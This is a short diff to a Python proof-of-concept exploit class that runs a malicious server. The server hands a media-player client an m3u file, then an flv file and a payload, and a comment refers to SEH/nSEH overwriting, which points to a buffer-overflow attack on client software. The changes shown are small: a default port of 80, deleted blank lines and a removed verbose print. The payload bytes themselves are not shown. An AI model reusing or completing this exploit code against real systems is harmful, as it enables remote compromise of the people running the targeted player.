@@ -39,13 +39,11 @@ class Poc(ABPoc):
             s = socket.socket()         # Create a socket object
             url = urlparse.urlparse(self.target).netloc
             host = socket.gethostbyname(url)   # Ip to listen to.
-            port = urlparse.urlparse(self.target).port     # Reserve a port for your service.
+            port = urlparse.urlparse(self.target).port if urlparse.urlparse(self.target).port else 80    # Reserve a port for your service.
             s.bind((host, port))         # Bind to the port
-
             s.listen(10)                 # Now wait for client connection.
             c, addr = s.accept()         # Establish connection with client.
             # Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
-
             c.recv(1024)
             #seh and nseh.
             buf =  ""
@@ -78,8 +76,6 @@ class Poc(ABPoc):
             c.close()
             c, addr = s.accept()        # Establish connection with client.
             # Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.
-            if args['options']['verbose']:
-                print(('[*] Sending the payload second time', addr))
             c.recv(1024)
             c.send(response)
             c.close()
